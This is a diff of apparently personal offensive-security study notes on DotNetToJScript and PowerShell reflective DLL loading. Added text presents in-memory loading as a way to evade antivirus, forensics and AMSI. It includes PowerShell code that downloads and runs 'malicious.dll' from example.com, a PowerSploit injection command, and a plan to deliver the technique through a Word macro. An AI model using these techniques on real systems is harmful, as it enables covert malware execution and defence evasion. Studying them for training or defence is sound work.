@@ -199,7 +199,7 @@ downloadFile(url, destination);
 c:\Users\dooley\Documents\github\DotNetToJScript>DotNetToJScript\bin\Debug\DotNetToJScript.exe ExampleAssembly\bin\Debug\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
 This tool should only be run on v2 of the CLR
 ```
-- solution to issue https://github.com/tyranid/DotNetToJScript/issues/19
+- solution to issue https://github.com/tyranid/     DotNetToJScript/issues/19
 - code to launch command prompt
 ```c#
 using System.Diagnostics;
@@ -467,6 +467,99 @@ $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
+
+Reflective loading in PowerShell is a technique used to load and execute a Dynamic Link Library (DLL) directly from memory, without the need for writing the DLL to disk. This approach is often used in offensive security scenarios, like in-memory execution of malicious code, because it avoids touching the filesystem, which can help evade antivirus detection and leave minimal traces for forensic analysis.
+
+### **Key Concepts in Reflective Loading:**
+
+1. **Reflection in Programming**: Reflection is the ability of a program to inspect, modify, or invoke its structure or behaviors at runtime. In PowerShell, this is often achieved using the .NET `System.Reflection` namespace, which provides mechanisms to load assemblies or modules into memory and invoke their methods dynamically.
+
+2. **Reflective DLL Injection**: Traditionally, DLL injection is a technique where a DLL is loaded into the address space of another process. Reflective DLL loading is a stealthier version, where the DLL is loaded directly into the memory of the process using a custom loader, without writing the DLL to disk.
+
+3. **PowerShell's Role**: PowerShell can facilitate reflective loading by using .NET and reflection to load a DLL directly from memory (or even from the web), bypassing the need to save the DLL to disk and potentially alerting security mechanisms like antivirus.
+
+---
+
+### **Example of Reflective Loading in PowerShell**
+
+In the example below, PowerShell uses reflection to load a DLL file that’s stored as a byte array (which could have been downloaded from a remote source) and invokes a method from it:
+
+```powershell
+# Example: Reflectively load a DLL in PowerShell and execute a method
+
+# Step 1: Load the DLL into memory as a byte array
+$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\dllfile.dll")
+
+# Step 2: Use Assembly.Load to load the DLL into memory using reflection
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+# Step 3: Get the type from the loaded assembly
+$type = $assembly.GetType("Namespace.ClassName")
+
+# Step 4: Instantiate the class (if needed) or directly invoke a static method
+$instance = [Activator]::CreateInstance($type)
+
+# Step 5: Invoke a method on the instance (or on the class if it's a static method)
+$method = $type.GetMethod("MethodName")
+$method.Invoke($instance, $null)  # If the method takes parameters, provide them in the array instead of $null
+```
+
+---
+
+### **Using PowerShell for Reflective DLL Injection**
+
+In offensive security, reflective DLL injection via PowerShell is often used in combination with post-exploitation frameworks like **Cobalt Strike** or **Metasploit**. These tools generate shellcode that reflects a DLL into memory, which PowerShell can run.
+
+Here’s an example that demonstrates loading a malicious DLL directly from the web:
+
+```powershell
+# Load DLL from a remote source (for instance, from an HTTP server)
+$webClient = New-Object System.Net.WebClient
+$bytes = $webClient.DownloadData("http://example.com/malicious.dll")
+
+# Reflectively load the DLL into memory
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+# Get the type and invoke methods
+$type = $assembly.GetType("MaliciousNamespace.MaliciousClass")
+$method = $type.GetMethod("Execute")
+$method.Invoke($null, $null)
+```
+
+### **Reflective Loading Tools in PowerShell**
+
+Some tools and frameworks simplify the process of reflective loading for offensive purposes. Here are a few:
+
+1. **Invoke-ReflectivePEInjection**: This script from PowerSploit allows you to inject a PE (Portable Executable) into the memory of a process using reflective DLL injection.
+   
+   Example usage:
+
+   ```powershell
+   Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessId 1234
+   ```
+
+2. **Invoke-Assembly**: This script allows you to reflectively load a .NET assembly and execute it in memory.
+
+---
+
+### **Reflective Loading vs Traditional Execution**
+
+| **Aspect**                | **Traditional Execution**                                        | **Reflective Loading**                                         |
+|---------------------------|------------------------------------------------------------------|----------------------------------------------------------------|
+| **Disk I/O**               | Requires writing DLLs to disk before loading.                   | Loads DLLs directly into memory, avoiding disk I/O.            |
+| **Detection**              | Easier for antivirus to detect because of file write operations. | Harder to detect since it avoids writing files to disk.        |
+| **Forensics**              | Leaves artifacts on disk, making forensic analysis easier.       | Leaves fewer forensic traces because it operates in memory.    |
+| **Persistence**            | Could be part of a persistent file or scheduled task.            | Typically used for in-memory execution without persistence.    |
+
+---
+
+### **Evading AMSI (Anti-Malware Scan Interface)**
+
+AMSI is a Windows security feature that scans PowerShell code in memory. Reflective loading can help bypass AMSI since the DLL is loaded into memory and executed without ever being directly written or interpreted as a PowerShell script.
+
+However, depending on how the PowerShell script is structured, AMSI might still intercept and scan portions of the PowerShell code. Some advanced offensive techniques attempt to **patch AMSI** in-memory (using tools like **AMSI bypasses**) before performing reflective loading.
+
+---
 
 ## TO DO:
 - Using what we have learned in these two modules, modify the C# and PowerShell code and use this technique from within a Word macro. Remember that Word runs as a 32-bit process.
